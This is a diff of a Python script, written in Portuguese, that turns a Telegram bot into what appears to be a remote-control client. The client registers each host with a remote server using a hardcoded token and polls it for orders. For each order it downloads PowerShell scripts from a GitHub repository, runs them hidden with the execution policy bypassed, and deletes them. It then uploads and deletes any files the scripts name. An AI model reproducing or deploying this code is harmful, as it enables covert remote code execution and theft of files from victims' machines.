@@ -1,139 +1,298 @@
-import asyncio
-import nest_asyncio
+import time
 import subprocess
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
-import logging
+import requests
+import socket
+import json
 from pathlib import Path
+import uuid
 
-nest_asyncio.apply()
-pasta = Path(r"C:\Windows\System32\ap32\Res-PE")
 
-TOKEN_FILE = Path(r"C:\Windows\System32\ap32\token.txt")
-TOKEN = TOKEN_FILE.read_text(encoding="utf-8").strip()
-ADMIN_ID = 123456789
+PASTA_SCRIPTS = Path(r"C:\Windows\System32\ap32\Res-PE")
+PASTA_DOWNLOADS = Path(r"C:\Windows\System32\ap32\Res-PE")
+FICHEIRO_RESULTADOS_PENDENTES = Path(r"C:\Windows\System32\ap32\resultados_pendentes.json")
+CLIENT_ID_FILE = Path(r"C:\Windows\System32\ap32\id.txt")
+
+
+SERVIDOR = "https://trapa.online:5000"
+REPO_BASE_URL = "https://raw.githubusercontent.com/katchupa-sabi/powershell_pranks/refs/heads/main/scripts"
+CLIENT_NOME = socket.gethostname() 
+TOKEN = "1739951c204b93b300cc0aef4bb831fba87ba4eb0dbb68b9c62d3746f4a8bdcd"
+INTERVALO = 2
+
+
+SCRIPT_DIR = Path(__file__).parent.resolve()
+NOME_CERT_SERVIDOR = "cert.pem" 
+CAMINHO_CERT = SCRIPT_DIR / NOME_CERT_SERVIDOR
+
+
+SSL_VERIFY_PATH = str(CAMINHO_CERT) if CAMINHO_CERT.exists() else True
+
+def obter_client_id():
+    if CLIENT_ID_FILE.exists():
+        return CLIENT_ID_FILE.read_text(encoding="utf-8").strip()
+    client_id = str(uuid.uuid4())
+    CLIENT_ID_FILE.write_text(client_id, encoding="utf-8")
+    return client_id
+
+CLIENT_ID = obter_client_id()
 
 
 def listar_scripts():
-    PS_SCRIPTS = {}
-    for item in pasta.iterdir():
+    scripts = {}
+    if not PASTA_SCRIPTS.exists():
+        return scripts
+    for item in PASTA_SCRIPTS.iterdir():
         if item.is_file():
-            chave = item.stem.lower()
-            PS_SCRIPTS[chave] = str(item)
-    return PS_SCRIPTS
+            scripts[item.stem.lower()] = str(item)
+    return scripts
 
 
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-
-# -------------------------
-# PERMISSÃO DO ADMIN
-# -------------------------
-async def verificar_permissao(update: Update):
-    if 123456789 != ADMIN_ID:
-        await update.message.reply_text("Acesso não autorizado.")
+def registar_cliente():
+    try:
+        resposta = requests.post(
+            f"{SERVIDOR}/registar",
+            json={"client_id": CLIENT_ID, "nome": CLIENT_NOME},
+            headers={"Authorization": f"Bearer {TOKEN}"},
+            verify=SSL_VERIFY_PATH,
+            timeout=15
+        )
+        resposta.raise_for_status()
+        return True
+    except requests.exceptions.SSLError as e:
+        print(f"[ERRO SSL] Certificado inválido: {e}")
         return False
-    return True
+    except requests.exceptions.RequestException:
+        return False
 
-# -------------------------
-# EXECUTOR DE SCRIPTS
-# -------------------------
-def executar_script(nome, PS_SCRIPTS):
-    caminho = PS_SCRIPTS.get(nome.lower())
-    if not caminho:
-        return "❌ Script não encontrado."
+
+def extrair_uploads(texto):
+    ficheiros = []
+    for linha in texto.splitlines():
+        linha = linha.strip()
+        if linha.upper().startswith("UPLOAD:"):
+            caminho = linha[7:].strip()
+            if caminho:
+                ficheiros.append(caminho)
+    return ficheiros
+
+
+def baixar_script(nome_script):
+    PASTA_DOWNLOADS.mkdir(parents=True, exist_ok=True)
+    nome_script = Path(nome_script).name
+
+    if not nome_script.lower().endswith(".ps1"):
+        nome_script += ".ps1"
+
+    url_download = f"{REPO_BASE_URL}/{nome_script}"
+
+    try:
+        resposta = requests.get(url_download, timeout=30, verify=True)
+
+        if resposta.status_code == 200:
+            caminho_destino = PASTA_DOWNLOADS / nome_script
+            with open(caminho_destino, "wb") as f:
+                f.write(resposta.content)
+            print(f"[INFO] Script descarregado como '{nome_script}'")
+            return str(caminho_destino)
+
+        elif resposta.status_code == 404:
+            print(f"[WARN] Script '{nome_script}' não encontrado no repositório.")
+            return None
+        else:
+            print(f"[ERROR] HTTP {resposta.status_code}: {resposta.text[:200]}")
+            return None
+
+    except requests.exceptions.RequestException as e:
+        print(f"[ERROR] Falha de rede: {e}")
+        return None
+    except Exception as e:
+        print(f"[ERROR] Erro inesperado: {e}")
+        return None
+
+
+def executar_script(nome):
+    caminho_baixado = baixar_script(nome)
+    if not caminho_baixado:
+        return False, f"Erro ao baixar o script '{nome}'.", []
 
     try:
         resultado = subprocess.run(
-            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", caminho],
-            capture_output=True,
-            text=True,
-            timeout=600
+            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", caminho_baixado],
+            capture_output=True, text=True, timeout=600
         )
 
-        saida = resultado.stdout.strip()
-        erro = resultado.stderr.strip()
+        stdout = resultado.stdout.strip()
+        stderr = resultado.stderr.strip()
+        ficheiros_para_enviar = extrair_uploads(stdout)
 
-        if erro:
-            return f"⚠ Erro do PowerShell:\n{erro}"
-        if not saida:
-            return "✔ Script executado (sem saída)."
-        return saida
+        try:
+            Path(caminho_baixado).unlink(missing_ok=True)
+            print(f"[INFO] Script removido de {caminho_baixado}")
+        except Exception:
+            pass
 
+        if stderr:
+            return False, stderr, ficheiros_para_enviar
+        return True, stdout if stdout else "Script executado com sucesso.", ficheiros_para_enviar
+
+    except subprocess.TimeoutExpired:
+        try: Path(caminho_baixado).unlink(missing_ok=True)
+        except Exception: pass
+        return False, "Tempo limite de execução excedido (10 min).", []
     except Exception as e:
-        return f"❌ Erro ao executar script: {e}"
+        return False, str(e), []
 
-# -------------------------
-# COMANDO /start
-# -------------------------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await verificar_permissao(update): return
 
-    PS_SCRIPTS = listar_scripts()  # lista atualizada
-    if not PS_SCRIPTS:
-        await update.message.reply_text("Não há scripts disponíveis no momento.")
+def pedir_ordem():
+    try:
+        resposta = requests.get(
+            f"{SERVIDOR}/ordem/{CLIENT_ID}", 
+            headers={"Authorization": f"Bearer {TOKEN}"}, 
+            verify=SSL_VERIFY_PATH, 
+            timeout=15
+        )
+        if resposta.status_code == 204:
+            return None
+        resposta.raise_for_status()
+        return resposta.json()
+    except requests.exceptions.SSLError as e:
+        print(f"[ERRO SSL] {e}")
+        return None
+    except requests.exceptions.RequestException:
+        return None
+
+
+def enviar_resultado(ordem_id, sucesso, resultado):
+    payload = {"client_id": CLIENT_ID, "ordem_id": ordem_id, "sucesso": sucesso, "resultado": resultado}
+    try:
+        resposta = requests.post(
+            f"{SERVIDOR}/resultado", 
+            json=payload, 
+            headers={"Authorization": f"Bearer {TOKEN}"}, 
+            verify=SSL_VERIFY_PATH,
+            timeout=15
+        )
+        resposta.raise_for_status()
+        return True
+    except requests.exceptions.RequestException:
+        guardar_resultado_pendente(payload)
+        return False
+
+
+def enviar_ficheiro(caminho_ficheiro, ordem_id="", descricao=""):
+    caminho = Path(caminho_ficheiro)
+    if not caminho.exists() or not caminho.is_file():
+        print(f"Ficheiro não encontrado: {caminho}")
+        return False
+
+    try:
+        with open(caminho, "rb") as f:
+            resposta = requests.post(
+                f"{SERVIDOR}/upload",
+                headers={"Authorization": f"Bearer {TOKEN}"},
+                data={"client_id": CLIENT_ID, "ordem_id": ordem_id, "descricao": descricao},
+                files={"ficheiro": (caminho.name, f)},
+                verify=SSL_VERIFY_PATH, 
+                timeout=60
+            )
+        resposta.raise_for_status()
+
+        try:
+            caminho.unlink()
+            print(f"Ficheiro enviado e apagado: {caminho}")
+        except Exception as e:
+            print(f"Upload feito, mas não foi possível apagar {caminho}: {e}")
+        return True
+    except requests.exceptions.SSLError as e:
+        print(f"[ERRO SSL] Não foi possível enviar {caminho}: {e}")
+        return False
+    except requests.exceptions.RequestException:
+        print(f"Servidor indisponível. Não foi possível enviar: {caminho}")
+        return False
+    except Exception as e:
+        print(f"Erro ao enviar ficheiro {caminho}: {e}")
+        return False
+
+
+def carregar_resultados_pendentes():
+    if not FICHEIRO_RESULTADOS_PENDENTES.exists():
+        return []
+    try:
+        with open(FICHEIRO_RESULTADOS_PENDENTES, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception:
+        return []
+
+
+def guardar_todos_resultados_pendentes(lista):
+    try:
+        with open(FICHEIRO_RESULTADOS_PENDENTES, "w", encoding="utf-8") as f:
+            json.dump(lista, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        print(f"Erro ao guardar resultados pendentes: {e}")
+
+
+def guardar_resultado_pendente(payload):
+    pendentes = carregar_resultados_pendentes()
+    pendentes.append(payload)
+    guardar_todos_resultados_pendentes(pendentes)
+
+
+def reenviar_resultados_pendentes():
+    pendentes = carregar_resultados_pendentes()
+    if not pendentes:
         return
 
-    lista = "\n".join(f"/{cmd}" for cmd in PS_SCRIPTS.keys())
-    await update.message.reply_text(
-        "Bot ativo! Scripts permitidos:\n\n" +
-        lista +
-        "\n\nUse qualquer comando desta lista para executar o script respetivo."
-    )
+    ainda_pendentes = []
+    for payload in pendentes:
+        try:
+            resposta = requests.post(
+                f"{SERVIDOR}/resultado", 
+                json=payload, 
+                headers={"Authorization": f"Bearer {TOKEN}"}, 
+                verify=SSL_VERIFY_PATH,
+                timeout=15
+            )
+            resposta.raise_for_status()
+        except requests.exceptions.RequestException:
+            ainda_pendentes.append(payload)
 
-# -------------------------
-# HANDLER GENÉRICO PARA QUALQUER COMANDO
-# -------------------------
-async def comando_generico(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await verificar_permissao(update): return
+    guardar_todos_resultados_pendentes(ainda_pendentes)
 
-    PS_SCRIPTS = listar_scripts()  # sempre atualiza
-    nome_cmd = update.message.text.replace("/", "").lower()
 
-    if nome_cmd not in PS_SCRIPTS:
-        await update.message.reply_text("❌ Script não encontrado.")
-        return
-
-    await update.message.reply_text(f"⏳ A executar '{nome_cmd}'...")
-
-    saida = executar_script(nome_cmd, PS_SCRIPTS)
-
-    if len(saida) > 3000:
-        with open("saida.txt", "w", encoding="utf-8") as f:
-            f.write(saida)
-        await update.message.reply_document(open("saida.txt", "rb"))
+def main():
+    print("Cliente iniciado. A aguardar ordens do servidor...")
+    if SSL_VERIFY_PATH is True:
+        print("[INFO] A usar certificados de sistema para verificar o servidor.")
     else:
-        await update.message.reply_text(saida)
+        print(f"[INFO] A verificar certificado do servidor em: {SSL_VERIFY_PATH}")
 
-# -------------------------
-# TEXTO NORMAL
-# -------------------------
-async def texto(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await verificar_permissao(update): return
-    await update.message.reply_text("Comando desconhecido. Use /start para ver os comandos permitidos.")
+    while True:
+        try:
+            registar_cliente()
+            reenviar_resultados_pendentes()
 
-# -------------------------
-# MAIN
-# -------------------------
-async def main():
-    app = ApplicationBuilder().token(TOKEN).build()
+            ordem = pedir_ordem()
+            if ordem:
+                ordem_id = ordem.get("id")
+                script = ordem.get("script")
 
-    # Comando /start (sempre primeiro!)
-    app.add_handler(CommandHandler("start", start))
+                if not ordem_id or not script:
+                    time.sleep(INTERVALO)
+                    continue
 
-    # Handler genérico para qualquer outro comando de script
-    app.add_handler(MessageHandler(filters.COMMAND & ~filters.Regex(r'^/start'), comando_generico))
+                print(f"\n[ORDEM RECEBIDA] Executando {ordem_id}: {script}")
+                sucesso, resultado, ficheiros_para_enviar = executar_script(script)
+                enviar_resultado(ordem_id, sucesso, resultado)
 
-    # Mensagens de texto normal
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, texto))
+                for ficheiro in ficheiros_para_enviar:
+                    enviar_ficheiro(ficheiro, ordem_id=ordem_id, descricao=f"Ficheiro enviado pelo script {script}")
 
-    print("Bot do Telegram em execução...")
-    await app.run_polling(close_loop=False)
+        except Exception as e:
+            print(f"\n[ERRO GERAL] {e}")
+
+        time.sleep(INTERVALO)
 
 
 if __name__ == "__main__":
-    asyncio.run(main())
-
-
+    main()
